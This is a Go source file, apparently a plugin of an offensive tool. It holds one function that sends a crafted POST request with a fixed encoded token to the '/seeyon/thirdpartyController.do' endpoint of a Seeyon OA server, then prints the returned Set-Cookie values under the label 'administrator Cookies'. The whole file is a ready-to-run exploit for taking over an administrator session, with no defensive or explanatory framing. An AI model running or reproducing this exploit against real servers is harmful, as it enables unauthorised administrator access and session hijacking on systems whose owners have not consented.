package plugin

import (
	"compress/gzip"
	"fmt"
	"github.com/fatih/color"
	"io"
	"net/http"
	"strings"
)

func Info_Cookies(urlFlag string) error {
	client := &http.Client{}
	data := "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
	req, err := http.NewRequest("POST", urlFlag+"/seeyon/thirdpartyController.do", strings.NewReader(data))
	if err != nil {
		return err
	}

	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36")
	req.Header.Add("Accept-Encoding", "gzip, deflate")
	req.Header.Add("Accept", "*/*")
	req.Header.Add("Cache-Control", "no-cache")
	req.Header.Add("Pragma", "no-cache")
	req.Header.Add("Content-Length", fmt.Sprint(len(data)))
	req.Header.Add("Connection", "close")

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	var reader io.ReadCloser
	switch resp.Header.Get("Content-Encoding") {
	case "gzip":
		reader, err = gzip.NewReader(resp.Body)
		defer reader.Close()
	default:
		reader = resp.Body
	}

	// 从Header中获取并处理Set-Cookie
	cookies := resp.Header["Set-Cookie"]
	if len(cookies) == 0 {
		color.Red("No Cookies!")
	} else {
		for _, cookie := range cookies {
			if idx := strings.Index(cookie, ";"); idx != -1 {
				color.Green("管理员Cookies: ")
				fmt.Println(cookie[:idx])
			}
		}
	}

	return nil
}
